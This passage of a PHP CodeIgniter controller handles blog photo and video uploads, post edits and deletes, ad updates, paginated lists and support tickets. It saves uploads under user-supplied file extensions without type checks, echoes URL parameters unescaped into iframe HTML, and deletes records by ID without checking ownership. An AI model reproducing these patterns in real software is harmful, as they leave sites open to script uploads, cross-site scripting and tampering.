                    echo "done";
                }
            }
            elseif ($para2 == 'update') {
                $this->form_validation->set_rules('title', translate('title'), 'required');
                $this->form_validation->set_rules('description', translate('description'), 'required');

                if ($this->form_validation->run() == FALSE) {
                    echo "<br>".validation_errors();
                }
                else{
                    if(!demo()){
                        $id = $this->input->post('blog_photo_id');
                        $data['title'] = $this->input->post('title');
                        $data['description'] = $this->input->post('description');

                        $img_features = json_decode($this->db->get_where('blog_photo', array('blog_photo_id' => $id))->row()->img_features, true);
                        $last_index = 0;
                        $this->load->library('image_lib');
                        ini_set("memory_limit", "-1");

                        $totally_new = array();
                        $replaced_new = array();
                        $untouched = array();

                        foreach ($_FILES['nimg']['name'] as $i => $row) {
                            if ($_FILES['nimg']['name'][$i] !== '') {
                                $ib = $i + 1;
                                $path = $_FILES['nimg']['name'][$i];
                                $ext = pathinfo($path, PATHINFO_EXTENSION);
                                $img = 'blog_photo_' . $id . '_' . $ib . '.' . $ext;
                                $img_thumb = 'blog_photo_' . $id . '_' . $ib . '_thumb.' . $ext;
                                $in_db = 'no';
                                foreach ($img_features as $roww) {
                                    if($roww['index'] == $i){
                                        $replaced_new[] = array('index' => $i, 'img' => $img, 'thumb' => $img_thumb);
                                        $in_db = 'yes';
                                    }
                                }
                                if ($in_db == 'no') {
                                    $totally_new[] = array('index' => $i, 'img' => $img, 'thumb' => $img_thumb);
                                }
                                move_uploaded_file($_FILES['nimg']['tmp_name'][$i], 'uploads/blog_photo_image/' . $img);

                                $config1['image_library'] = 'gd2';
                                $config1['create_thumb'] = TRUE;
                                $config1['maintain_ratio'] = TRUE;
                                $config1['width'] = '400';
                                $config1['height'] = '400';
                                $config1['source_image'] = 'uploads/blog_photo_image/' . $img;

                                $this->image_lib->initialize($config1);
                                $this->image_lib->resize();
                                $this->image_lib->clear();
                            }
                        }

                        $touched = $replaced_new + $totally_new;
                        foreach ($img_features as $yy) {
                            $is_touched = 'no';
                            foreach ($touched as $rr) {
                                if($yy['index'] == $rr['index']){
                                    $is_touched = 'yes';
                                }
                            }
                            if($is_touched == 'no'){
                                $untouched[] = $yy;
                            }
                        }
                        $new_img_features = array();
                        foreach ($replaced_new as $k) {
                            $new_img_features[] = $k;
                        }
                        foreach ($totally_new as $k) {
                            $new_img_features[] = $k;
                        }
                        foreach ($untouched as $k) {
                            $new_img_features[] = $k;
                        }
                        sort_array_of_array($new_img_features, 'index'); // Sort the data with Index

                        $data['img_features'] = json_encode($new_img_features);
                        $this->db->where('blog_photo_id', $id);
                        $this->db->update('blog_photo', $data);
                    }
                    recache();
                    echo 'done';

                }
            }
        }
        elseif ($para1 == "pay_for_video_post") {
            if ($para2 == 'do_add') {

                $this->form_validation->set_rules('video_title', translate('video_title'), 'required');
                $this->form_validation->set_rules('video_description', translate('video_description'), 'required');

                if ($this->form_validation->run() == FALSE) {
                    echo "<br>".validation_errors();
                } else {
                    if(!demo()){
                        $user_id = $this->session->userdata('user_id');

                        $data['title'] = $this->input->post('video_title');
                        $data['description'] = $this->input->post('video_description');
                        $data['status'] = 'published';
                        $data['hide_status'] = 'false';
                        $data['timestamp'] = time();
                        $data['blog_video_uploader_type'] = 'user';
                        $data['blog_video_uploader_id'] = $user_id;
                        $data['edited_by'] = '[]';
                        if ($this->input->post('upload_method') == 'upload') {
                            $data['type'] = 'upload';
                            $data['from'] = 'local';
                            $data['video_link'] = '';
                            $data['video_src'] = '';
                            $this->db->insert('blog_video', $data);
                            $id = $this->db->insert_id();
                            $video = $_FILES['upload_video']['name'];
                            $ext = pathinfo($video, PATHINFO_EXTENSION);
                            move_uploaded_file($_FILES['upload_video']['tmp_name'], 'uploads/blog_video/blog_video_' . $id . '.' . $ext);
                            $data['video_src'] = 'uploads/blog_video/blog_video_' . $id . '.' . $ext;
                            $this->db->where('blog_video_id', $id);
                            $this->db->update('blog_video', $data);
                        } elseif ($this->input->post('upload_method') == 'share') {
                            $data['type'] = 'share';
                            $data['from'] = $this->input->post('site');
                            $data['video_link'] = $this->input->post('video_link');
                            $code = $this->input->post('vl');
                            if ($this->input->post('site') == 'youtube') {
                                $data['video_src'] = 'https://www.youtube.com/embed/' . $code;
                            } else if ($this->input->post('site') == 'dailymotion') {
                                $data['video_src'] = '//www.dailymotion.com/embed/video/' . $code;
                            } else if ($this->input->post('site') == 'vimeo') {
                                $data['video_src'] = 'https://player.vimeo.com/video/' . $code;
                            }
                            $this->db->insert('blog_video', $data);
                            $id = $this->db->insert_id();
                        }

                        // Subtracting Blog Post Amount
                        $remaining_video = $this->Crud_model->get_type_name_by_id('user', $user_id, 'video_amount');
                        $video_amount = $remaining_video - 1;
                        $this->db->where('user_id', $user_id);
                        $this->db->update('user', array('video_amount' => $video_amount));
                    }
                    recache();
                    echo "done";
                }
            }
            else if ($para2 == 'preview') {
                if ($para3 == 'youtube') {
                    echo '<iframe width="400" height="300" src="https://www.youtube.com/embed/' . $para4 . '" frameborder="0"></iframe>';
                } else if ($para3 == 'dailymotion') {
                    echo '<iframe width="400" height="300" src="//www.dailymotion.com/embed/video/' . $para4 . '" frameborder="0"></iframe>';
                } else if ($para3 == 'vimeo') {
                    echo '<iframe src="https://player.vimeo.com/video/' . $para4 . '" width="400" height="300" frameborder="0"></iframe>';
                }
            }
            else if ($para2 == 'update') {
                $this->form_validation->set_rules('video_title', translate('video_title'), 'required');
                $this->form_validation->set_rules('video_description', translate('video_description'), 'required');

                if ($this->form_validation->run() == FALSE) {
                    echo "<br>".validation_errors();
                }
                else{
                    if(!demo()){
                        $id = $this->input->post('blog_video_id');
                        $type = $this->db->get_where('blog_video', array('blog_video_id' => $id))->row()->type;
                        $data['title'] = $this->input->post('video_title');
                        $data['description'] = $this->input->post('video_description');
                        if ($this->input->post('change_check') == 1) {
                            if ($type == 'upload') {
                                $src = $this->db->get_where('blog_video', array('blog_video_id' => $id))->row()->video_src;
                                if (file_exists($src)) {
                                    unlink($src);
                                }
                            }
                            if ($this->input->post('upload_method') == 'upload') {
                                $data['type'] = 'upload';
                                $data['from'] = 'local';
                                if (!($_FILES['upload_video']['name'] == '')) {
                                    $video = $_FILES['upload_video']['name'];
                                    $ext = pathinfo($video, PATHINFO_EXTENSION);
                                    move_uploaded_file($_FILES['upload_video']['tmp_name'], 'uploads/blog_video/blog_video_' . $id . '.' . $ext);
                                    $data['video_src'] = 'uploads/blog_video/blog_video_' . $id . '.' . $ext;
                                }
                            } else if ($this->input->post('upload_method') == 'share') {
                                $data['type'] = 'share';
                                $data['from'] = $this->input->post('site');
                                $data['video_link'] = $this->input->post('video_link');
                                $data['video_code'] = $this->input->post('vl');
                                if ($this->input->post('site') == 'youtube') {
                                    $data['video_src'] = 'https://www.youtube.com/embed/' . $data['video_code'];
                                } else if ($this->input->post('site') == 'dailymotion') {
                                    $data['video_src'] = '//www.dailymotion.com/embed/video/' . $data['video_code'];
                                } else if ($this->input->post('site') == 'vimeo') {
                                    $data['video_src'] = 'https://player.vimeo.com/video/' . $data['video_code'];
                                }
                            }
                        }
                        $this->db->where('blog_video_id', $id);
                        $this->db->update('blog_video', $data);
                    }
                    recache();
                    echo 'done';
                }
            }
        }
        elseif ($para1 == "blog_edit") {

            if ($para2 =='edit') {
                $page_data['get_blog'] = $this->db->get_where('blog',array('blog_id' => $para3))->result();

                $this->load->view('front/user/profile/blog_edit', $page_data);
            }
            elseif ($para2 == 'update') {
                $this->form_validation->set_rules('title', translate('title'), 'required');
                $this->form_validation->set_rules('summary', translate('summary'), 'required');
                $this->form_validation->set_rules('description', translate('description'), 'required');
                $this->form_validation->set_rules('blog_category', translate('blog_category'), 'required');
                $this->form_validation->set_rules('blog_sub_category', translate('blog_sub_category'), 'required');

                if ($this->form_validation->run() == FALSE) {
                    echo "<br>".validation_errors();
                } else {
                    $user_id = $this->session->userdata('user_id');

                    $data['blog_id'] = $this->input->post('blog_id');
                    $data['title'] = $this->input->post('title');
                    $data['summary'] = $this->input->post('summary');
                    $data['description'] = $this->input->post('description');
                    $data['blog_category_id'] = $this->input->post('blog_category');
                    $data['blog_sub_category_id'] = $this->input->post('blog_sub_category');
                    $data['date'] = strtotime($this->input->post('date'));
                    $data['timestamp'] = time();
                    $data['tag'] = $this->input->post('tag');
                    $edited_by[] = array('user' => $user_id, 'timestamp' => time());
                    $data['edited_by'] = json_encode($edited_by);

                    $this->db->where('blog_id', $data['blog_id']);
                    $this->db->update('blog', $data);
                    $id = $this->db->insert_id();

                    if(!demo()){
                        $img_features = json_decode($this->db->get_where('blog', array('blog_id' => $data['blog_id']))->row()->img_features, true);
                        $last_index = 0;

                        $this->load->library('image_lib');
                        ini_set("memory_limit", "-1");

                        $totally_new = array();
                        $replaced_new = array();
                        $untouched = array();
    					if(isset($_FILES['nimg'])){
    						foreach ($_FILES['nimg']['name'] as $i => $row) {
    							if ($_FILES['nimg']['name'][$i] !== '') {
    								$ib = $i + 1;
    								$path = $_FILES['nimg']['name'][$i];
    								$ext = pathinfo($path, PATHINFO_EXTENSION);
    								$img = 'blog_' . $data['blog_id'] . '_' . $ib . '.' . $ext;
    								$img_thumb = 'blog_' . $data['blog_id'] . '_' . $ib . '_thumb.' . $ext;
    								$in_db = 'no';
    								foreach ($img_features as $roww) {
    									if($roww['index'] == $i){
    										$replaced_new[] = array('index' => $i, 'img' => $img, 'thumb' => $img_thumb);
    										$in_db = 'yes';
    									}
    								}
    								if ($in_db == 'no') {
    									$totally_new[] = array('index' => $i, 'img' => $img, 'thumb' => $img_thumb);
    								}
    								move_uploaded_file($_FILES['nimg']['tmp_name'][$i], 'uploads/blog_image/' . $img);

    								$config1['image_library'] = 'gd2';
    								$config1['create_thumb'] = TRUE;
    								$config1['maintain_ratio'] = TRUE;
    								$config1['width'] = '400';
    								$config1['height'] = '400';
    								$config1['source_image'] = 'uploads/blog_image/' . $img;

    								$this->image_lib->initialize($config1);
    								$this->image_lib->resize();
    								$this->image_lib->clear();
    							}
    						}
    					}

                        $touched = $replaced_new + $totally_new;
                        foreach ($img_features as $yy) {
                            $is_touched = 'no';
                            foreach ($touched as $rr) {
                                if($yy['index'] == $rr['index']){
                                    $is_touched = 'yes';
                                }
                            }
                            if($is_touched == 'no'){
                                $untouched[] = $yy;
                            }
                        }
                        $new_img_features = array();
                        foreach ($replaced_new as $k) {
                            $new_img_features[] = $k;
                        }
                        foreach ($totally_new as $k) {
                            $new_img_features[] = $k;
                        }
                        foreach ($untouched as $k) {
                            $new_img_features[] = $k;
                        }
                        sort_array_of_array($new_img_features, 'index'); // Sort the data with Index
                        $data1['img_features'] = json_encode($new_img_features);
                        $this->db->where('blog_id', $data['blog_id']);
                        $this->db->update('blog', $data1);
                    }
                    recache();
                    echo "done";
                }
            }
            elseif ($para2 == 'sub_by_cat') {
               echo $this->Crud_model->select_html('blog_sub_category', 'blog_sub_category', 'name', 'edit', 'custom-input-field-1', '', 'parent_category_id', $para3, '');
            }
            elseif ($para2 == 'delete_img') {
                if(!demo()){
    	            $new_img_features = array();
    	            $old_img_features = json_decode($this->db->get_where('blog', array('blog_id' => $para3))->row()->img_features, true);
    	            foreach ($old_img_features as $row2) {
    	                if ($row2['img'] == $para4) {
    	                    if (file_exists('uploads/blog_image/' . $row2['img'])) {
    	                        unlink('uploads/blog_image/' . $row2['img']);
    	                    }
    	                    if (file_exists('uploads/blog_image/' . $row2['thumb'])) {
    	                        unlink('uploads/blog_image/' . $row2['thumb']);
    	                    }
    	                } else {
    	                    $new_img_features[] = $row2;
    	                }
    	            }
    	            $data['img_features'] = json_encode($new_img_features);
    	            $this->db->where('blog_id', $para3);
    	            $this->db->update('blog', $data);
                }
	            recache();
	        }
        }

        elseif ($para1 == "blog_delete") {
            if(!demo()){
                $img_features = json_decode($this->db->get_where('blog', array('blog_id' => $para2))->row()->img_features, true);

                foreach ($img_features as $row) {
                    if (file_exists('uploads/blog_image/' . $row['img'])) {
                        unlink('uploads/blog_image/' . $row['img']);
                    }
                    if (file_exists('uploads/blog_image/' . $row['thumb'])) {
                        unlink('uploads/blog_image/' . $row['thumb']);
                    }
                }

                $this->db->where('blog_id', $para2);
                $this->db->delete('blog');
            }
            recache();
        }
        elseif ($para1 == "blog_photo_delete") {
            if(!demo()){
                $img_features = json_decode($this->db->get_where('blog_photo', array('blog_photo_id' => $para2))->row()->img_features, true);
                foreach ($img_features as $row) {
                    if (file_exists('uploads/blog_photo_image/' . $row['img'])) {
                        unlink('uploads/blog_photo_image/' . $row['img']);
                    }
                    if (file_exists('uploads/blog_photo_image/' . $row['thumb'])) {
                        unlink('uploads/blog_photo_image/' . $row['thumb']);
                    }
                }

                $this->db->where('blog_photo_id', $para2);
                $this->db->delete('blog_photo');
            }
            recache();
        }

        elseif ($para1 == "blog_video_delete") {
            if(!demo()){
                $src = $this->db->get_where('blog_video', array('blog_video_id' => $para2))->row()->video_src;
                if (file_exists($src)) {
                    unlink($src);
                }
                $this->db->where('blog_video_id', $para2);
                $this->db->delete('blog_video');
            }
            recache();
        }
        elseif ($para1 == "blog_photo_edit") {

            if ($para2 =='edit') {
                $page_data['get_blog_photo'] = $this->db->get_where('blog_photo',array('blog_photo_id' => $para3))->result();

                $this->load->view('front/user/profile/blog_photo_edit', $page_data);
            }
            elseif ($para2 == 'update') {

            }
        }

        elseif ($para1 == "blog_video_edit") {

            if ($para2 =='edit') {
                $page_data['get_blog_video'] = $this->db->get_where('blog_video',array('blog_video_id' => $para3))->result();

                $this->load->view('front/user/profile/blog_video_edit', $page_data);
            }
            elseif ($para2 == 'update') {

            }
        }


        elseif ($para1 == "premium_post_packages") {
            $page_data['package_id']   = $para2;
            $this->load->view('front/user/profile/premium_post_packages/index', $page_data);
        }
        else if($para1 == 'package'){
            $page_data['all_subscriptions'] = $this->db->get("subscription")->result();
            $this->load->view('front/user/profile/premium_post_packages/packages',$page_data);
        }
        else if($para1 == 'packages_list'){
            $this->load->view('front/user/profile/package_list/index');
        }
        else if($para1 == 'payment_options'){
            $page_data['p_set'] = $this->Crud_model->get_settings_value('business_settings','paypal_set','value');
            $page_data['s_set'] = $this->Crud_model->get_settings_value('business_settings','stripe_set','value');
            $page_data['system_name'] = $this->Crud_model->get_settings_value('general_settings','system_name','value');
            $this->load->view('front/advertise/apply/payment_options',$page_data);
        }
        elseif ($para1 == "ad_list") {
            if($para2 == 'edit'){
                $page_data['ad_info'] = $this->db->get_where('advertisement',array('advertisement_id' => $para3))->row();
                $this->load->view('front/user/profile/edit_ad_info',$page_data);
            }
            elseif($para2 == 'update'){
                if(!demo()){
                    $temp = $this->db->get_where('advertisement',array('advertisement_id' => $para3))->row()->post_details;
                    $temp = json_decode($temp,true);
                    if(count($temp) == 0){
                        $img_data = '';
                    } else {
                        foreach($temp as $row){
                            $img_data = $row['img'];
                        }
                    }
                    if($_FILES['img']['error'] == UPLOAD_ERR_NO_FILE ){
                        $img = $img_data;
                    } else {
                        $path = $_FILES['img']['name'];
                        $ext  = pathinfo($path,PATHINFO_EXTENSION);
                        $img  = 'user_banner_'.$para3.'.'.$ext;
                    }
                    $url  = $this->input->post('url');

                    $post_data = array();
                    $post_data[] = array(
                        "img"   => $img,
                        "url"   => $url
                    );
                    $data['post_details']   = json_encode($post_data);
                    $this->db->where('advertisement_id',$para3);
                    $this->db->update('advertisement',$data);
                    move_uploaded_file($_FILES['img']['tmp_name'], 'uploads/default_banner/'.$img);
                }
                echo 'done';
            }
            elseif($para2 == "status"){
                if($para4 == 'true'){
                    $data['user_status'] = 'ok';
                }
                else if($para4 == 'false'){
                    $data['user_status'] = 'no';
                }
                $this->db->where('advertisement_id',$para3);
                $this->db->update('advertisement',$data);
            }
            else{
                $user_id                    = $this->session->userdata('user_id');
                $page_data['paid_ad_list']  = $this->db->get_where('advertisement_payment',array('user_id' => $user_id,'payment_status'=> 'paid'))->result_array();
                $this->load->view('front/user/profile/ad_list',$page_data);
            }
        }

        elseif ($para1 == "message_box") {
            $page_data['ticket'] = $para2;
            $this->Crud_model->ticket_message_viewed($para2, 'user');
            $this->load->view('front/user/profile/message_box', $page_data);
        }

        elseif ($para1 == "message_view") {
            $page_data['ticket'] = $para2;
            $page_data['message_data'] = $this->db->get_where('ticket', array(
                        'ticket_id' => $para2
                    ))->result_array();
            $this->Crud_model->ticket_message_viewed($para2, 'user');
            $this->load->view('front/user/profile/message_view', $page_data);
        }
        elseif ($para1 == "blog_list") {
            $user_id = $this->session->userdata('user_id');
            $page_data['blog_video_list'] = $this->db->order_by('blog_video_id', 'DESC')->get_where('blog_video',array('blog_video_uploader_id' => $user_id))->result_array();
            $this->load->view('front/user/profile/blog_list/index.php',$page_data);
        }

        else {
            $page_data['part'] = 'gp';
            if ($para1 == "rl") {
                $page_data['part'] = 'rl';
            } elseif ($para1 == "up") {
                $page_data['part'] = 'up';
            } elseif ($para1 == "ad") {
                $page_data['part'] = 'ad_list';
                $page_data['ad_id']   = $para2;
            } elseif ($para1 == "ad_info") {
                $page_data['part'] = 'ad_info';
            } elseif ($para1 == "pfp") {
                $page_data['part'] = 'pfp';
            } elseif ($para1 == "pp") {
                $page_data['part'] = 'pp';
            } elseif ($para1 == "blog_lst") {
                $page_data['part'] = 'blog_lst';
            }
            $page_data['page_title'] = translate('user_profile');
            $page_data['asset_page'] = 'profile';
            $page_data['page_name'] = 'user/profile';
            $this->load->view('front/index', $page_data);
        }
    }

    function ajax_package_list($para1 = '') {
        $this->load->library('Ajax_pagination');

        // pagination
        $this->db->where('user_id', $this->session->userdata('user_id'));
        $config['total_rows'] = $this->db->count_all_results('subscription_payment');
        //$config['base_url'] = base_url() . 'index.php?home/listed/';
        $config['per_page'] = 10;
        $config['uri_segment'] = 5;
        $config['cur_page_giv'] = $para1;

        $function = "filter_package('0')";
        $config['first_link'] = '&laquo;';
        $config['first_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['first_tag_close'] = '</a></li>';

        $rr = ($config['total_rows'] - 1) / $config['per_page'];
        $last_start = floor($rr) * $config['per_page'];
        $function = "filter_package('" . $last_start . "')";
        $config['last_link'] = '&raquo;';
        $config['last_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['last_tag_close'] = '</a></li>';

        $function = "filter_package('" . ($para1 - $config['per_page']) . "')";
        $config['prev_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['prev_tag_close'] = '</a></li>';

        $function = "filter_package('" . ($para1 + $config['per_page']) . "')";
        $config['next_link'] = '&rsaquo;';
        $config['next_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['next_tag_close'] = '</a></li>';

        $config['full_tag_open'] = '<ul class="pagination">';
        $config['full_tag_close'] = '</ul>';

        $config['cur_tag_open'] = '<li class="active"><a>';
        $config['cur_tag_close'] = '<span class="sr-only">(current)</span></a></li>';

        $function = "filter_package(((this.innerHTML-1)*" . $config['per_page'] . "))";
        $config['num_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['num_tag_close'] = '</a></li>';
        $this->ajax_pagination->initialize($config);

        $this->db->where('user_id', $this->session->userdata('user_id'));
        $this->db->order_by('subscription_payment_id', 'desc');
        $page_data['packages_list'] = $this->db->get('subscription_payment', $config['per_page'], $para1)->result_array();
        $page_data['count'] = $config['total_rows'];

        $this->load->view('front/user/profile/package_list/ajax_list', $page_data);
    }

    function preview_package_remainings($user_id, $type) {
        $page_data['type'] = $type;
        $page_data['user_info'] = $this->db->get_where('user',array('user_id' => $user_id))->row();
        $this->load->view('front/user/package_remainings_modal',$page_data);
    }

    function blog_profile() {
        if ($this->session->userdata('user_login') !== "yes") {
            redirect(base_url() . 'home', 'refresh');
        }
		$user_id = $this->session->userdata('user_id');

        $page_data['blogger_id'] = $user_id;
        $page_data['user_info'] = $this->db->get_where('user', array('user_id' => $user_id))->result_array();
        $page_data['page_title'] = translate('blog_profile');
        $page_data['asset_page'] = 'profile';
        $page_data['page_name'] = 'user/blog_profile';
        $page_data['my_categories'] = $this->db->select('DISTINCT(blog_category_id)')->get_where('blog',array('blog_uploader_id' => $user_id))->result();
        $this->load->view('front/index', $page_data);
    }

    function ajax_blog_profile_list($para1 = '') {
        $this->load->library('Ajax_pagination');

        // pagination
        $this->db->where('blog_uploader_id', $this->session->userdata('user_id'));
        $this->db->where('status', 'published');
        $this->db->where('hide_status', 'false');
        $config['total_rows'] = $this->db->count_all_results('blog');
        //$config['base_url'] = base_url() . 'index.php?home/listed/';
        $config['per_page'] = 6;
        $config['uri_segment'] = 5;
        $config['cur_page_giv'] = $para1;

        $function = "filter_blog_profile('0')";
        $config['first_link'] = '&laquo;';
        $config['first_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['first_tag_close'] = '</a></li>';

        $rr = ($config['total_rows'] - 1) / $config['per_page'];
        $last_start = floor($rr) * $config['per_page'];
        $function = "filter_blog_profile('" . $last_start . "')";
        $config['last_link'] = '&raquo;';
        $config['last_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['last_tag_close'] = '</a></li>';

        $function = "filter_blog_profile('" . ($para1 - $config['per_page']) . "')";
        $config['prev_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['prev_tag_close'] = '</a></li>';

        $function = "filter_blog_profile('" . ($para1 + $config['per_page']) . "')";
        $config['next_link'] = '&rsaquo;';
        $config['next_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['next_tag_close'] = '</a></li>';

        $config['full_tag_open'] = '<ul class="pagination">';
        $config['full_tag_close'] = '</ul>';

        $config['cur_tag_open'] = '<li class="active"><a>';
        $config['cur_tag_close'] = '<span class="sr-only">(current)</span></a></li>';

        $function = "filter_blog_profile(((this.innerHTML-1)*" . $config['per_page'] . "))";
        $config['num_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['num_tag_close'] = '</a></li>';
        $this->ajax_pagination->initialize($config);

        $this->db->where('blog_uploader_id', $this->session->userdata('user_id'));
        $this->db->where('status', 'published');
        $this->db->where('hide_status', 'false');
        $page_data['blog_profile'] = $this->db->get('blog', $config['per_page'], $para1)->result_array();
        $page_data['count'] = $config['total_rows'];

        $this->load->view('front/user/blog_profile/ajax_list', $page_data);
    }

    function ajax_blog_profile_photo_list($para1 = '') {
        $this->load->library('Ajax_pagination');

        // pagination
        $this->db->where('blog_photo_uploader_id', $this->session->userdata('user_id'));
        $this->db->where('status', 'published');
        $this->db->where('hide_status', 'false');
        $config['total_rows'] = $this->db->count_all_results('blog_photo');
        //$config['base_url'] = base_url() . 'index.php?home/listed/';
        $config['per_page'] = 9;
        $config['uri_segment'] = 5;
        $config['cur_page_giv'] = $para1;

        $function = "filter_blog_photo('0')";
        $config['first_link'] = '&laquo;';
        $config['first_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['first_tag_close'] = '</a></li>';

        $rr = ($config['total_rows'] - 1) / $config['per_page'];
        $last_start = floor($rr) * $config['per_page'];
        $function = "filter_blog_photo('" . $last_start . "')";
        $config['last_link'] = '&raquo;';
        $config['last_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['last_tag_close'] = '</a></li>';

        $function = "filter_blog_photo('" . ($para1 - $config['per_page']) . "')";
        $config['prev_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['prev_tag_close'] = '</a></li>';

        $function = "filter_blog_photo('" . ($para1 + $config['per_page']) . "')";
        $config['next_link'] = '&rsaquo;';
        $config['next_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['next_tag_close'] = '</a></li>';

        $config['full_tag_open'] = '<ul class="pagination">';
        $config['full_tag_close'] = '</ul>';

        $config['cur_tag_open'] = '<li class="active"><a>';
        $config['cur_tag_close'] = '<span class="sr-only">(current)</span></a></li>';

        $function = "filter_blog_photo(((this.innerHTML-1)*" . $config['per_page'] . "))";
        $config['num_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['num_tag_close'] = '</a></li>';
        $this->ajax_pagination->initialize($config);

        $this->db->where('blog_photo_uploader_id', $this->session->userdata('user_id'));
        $this->db->where('status', 'published');
        $this->db->where('hide_status', 'false');
        $page_data['blog_photo_profile'] = $this->db->get('blog_photo', $config['per_page'], $para1)->result_array();
        $page_data['count'] = $config['total_rows'];

        $this->load->view('front/user/blog_profile/ajax_photo_list', $page_data);
    }

    function ajax_blog_profile_video_list($para1 = '') {
        $this->load->library('Ajax_pagination');

        // pagination
        $this->db->where('blog_video_uploader_id', $this->session->userdata('user_id'));
        $this->db->where('status', 'published');
        $this->db->where('hide_status', 'false');
        $config['total_rows'] = $this->db->count_all_results('blog_video');
        //$config['base_url'] = base_url() . 'index.php?home/listed/';
        $config['per_page'] = 9;
        $config['uri_segment'] = 5;
        $config['cur_page_giv'] = $para1;

        $function = "filter_blog_video('0')";
        $config['first_link'] = '&laquo;';
        $config['first_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['first_tag_close'] = '</a></li>';

        $rr = ($config['total_rows'] - 1) / $config['per_page'];
        $last_start = floor($rr) * $config['per_page'];
        $function = "filter_blog_video('" . $last_start . "')";
        $config['last_link'] = '&raquo;';
        $config['last_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['last_tag_close'] = '</a></li>';

        $function = "filter_blog_video('" . ($para1 - $config['per_page']) . "')";
        $config['prev_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['prev_tag_close'] = '</a></li>';

        $function = "filter_blog_video('" . ($para1 + $config['per_page']) . "')";
        $config['next_link'] = '&rsaquo;';
        $config['next_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['next_tag_close'] = '</a></li>';

        $config['full_tag_open'] = '<ul class="pagination">';
        $config['full_tag_close'] = '</ul>';

        $config['cur_tag_open'] = '<li class="active"><a>';
        $config['cur_tag_close'] = '<span class="sr-only">(current)</span></a></li>';

        $function = "filter_blog_video(((this.innerHTML-1)*" . $config['per_page'] . "))";
        $config['num_tag_open'] = '<li><a onClick="' . $function . '">';
        $config['num_tag_close'] = '</a></li>';
        $this->ajax_pagination->initialize($config);

        $this->db->where('blog_video_uploader_id', $this->session->userdata('user_id'));
        $this->db->where('status', 'published');
        $this->db->where('hide_status', 'false');
        $page_data['blog_video_profile'] = $this->db->get('blog_video', $config['per_page'], $para1)->result_array();
        $page_data['count'] = $config['total_rows'];

        $this->load->view('front/user/blog_profile/ajax_video_list', $page_data);
    }

    /* Support Ticket For USER */

    function ticket_message($para1 = '') {
        $page_data['page_name'] = "ticket_message";
        $page_data['ticket'] = $para1;
        $page_data['message_data'] = $this->db->get_where('ticket', array(
                    'ticket_id' => $para1
                ))->result_array();
        $this->Crud_model->ticket_message_viewed($para1, 'user');
        $page_data['msgs'] = $this->db->get_where('ticket_message', array('ticket_id' => $para1))->result_array();
        $page_data['ticket_id'] = $para1;
        $page_data['page_name'] = "ticket_message";
        $page_data['page_title'] = translate('ticket_message');
        $this->load->view('front/index', $page_data);
    }

    function ticket_message_add() {
        $this->load->library('form_validation');
        $safe = 'yes';
        $char = '';
        foreach ($_POST as $row) {
            if (preg_match('/[\^}{#~|+¬]/', $row, $match)) {
                $safe = 'no';
                $char = $match[0];
            }
        }

        $this->form_validation->set_rules('sub', 'Subject', 'required');
        $this->form_validation->set_rules('reply', 'Message', 'required');

        if ($this->form_validation->run() == FALSE) {
            echo validation_errors();
        } else {
            if ($safe == 'yes') {
                $data['time'] = time();
                $data['subject'] = $this->input->post('sub');
                $id = $this->session->userdata('user_id');
                $data['from_where'] = json_encode(array('type' => 'user', 'id' => $id));
                $data['to_where'] = json_encode(array('type' => 'admin', 'id' => ''));
                $data['view_status'] = 'ok';
                $this->db->insert('ticket', $data);
                $ticket_id = $this->db->insert_id();
                $data1['message'] = $this->input->post('reply');
                $data1['time'] = time();
                if (!empty($this->db->get_where('ticket_message', array('ticket_id' => $ticket_id))->row()->ticket_id)) {
                    $data1['from_where'] = $this->db->get_where('ticket_message', array('ticket_id' => $ticket_id))->row()->from_where;
                    $data1['to_where'] = $this->db->get_where('ticket_message', array('ticket_id' => $ticket_id))->row()->to_where;
                } else {
                    $data1['from_where'] = $this->db->get_where('ticket', array('ticket_id' => $ticket_id))->row()->from_where;
                    $data1['to_where'] = $this->db->get_where('ticket', array('ticket_id' => $ticket_id))->row()->to_where;
                }
                $data1['ticket_id'] = $ticket_id;
                $data1['view_status'] = json_encode(array('user_show' => 'ok', 'admin_show' => 'no'));
                $data1['subject'] = $this->db->get_where('ticket', array('ticket_id' => $ticket_id))->row()->subject;
                $this->db->insert('ticket_message', $data1);
                echo 'success#-#-#';
            } else {
                echo 'fail#-#-#Disallowed charecter : " ' . $char . ' " in the POST';
            }
        }
    }

    function ticket_reply($para1 = '') {
        $this->load->library('form_validation');
        $safe = 'yes';
        $char = '';
        foreach ($_POST as $row) {
            if (preg_match('/[\^}{#~|+¬]/', $row, $match)) {
                $safe = 'no';
                $char = $match[0];
            }
        }

        $this->form_validation->set_rules('reply', 'Message', 'required');

        if ($this->form_validation->run() == FALSE) {
            echo validation_errors();
        } else {
            if ($safe == 'yes') {
                $data['message'] = $this->input->post('reply');
                $data['time'] = time();
                if (!empty($this->db->get_where('ticket_message', array('ticket_id' => $para1))->row()->ticket_id)) {
                    $data['from_where'] = $this->db->get_where('ticket_message', array('ticket_id' => $para1))->row()->from_where;
                    $data['to_where'] = $this->db->get_where('ticket_message', array('ticket_id' => $para1))->row()->to_where;
                } else {
                    $data['from_where'] = $this->db->get_where('ticket', array('ticket_id' => $para1))->row()->from_where;
                    $data['to_where'] = $this->db->get_where('ticket', array('ticket_id' => $para1))->row()->to_where;
                }
                $data['ticket_id'] = $para1;
                $data['view_status'] = json_encode(array('user_show' => 'ok', 'admin_show' => 'no'));
                $data['subject'] = $this->db->get_where('ticket', array('ticket_id' => $para1))->row()->subject;
                $this->db->insert('ticket_message', $data);
                echo 'success#-#-#';
            } else {
                echo 'fail#-#-#Disallowed charecter : " ' . $char . ' " in the POST';
            }
        }
    }

    function ticket_listed($para2 = '') {
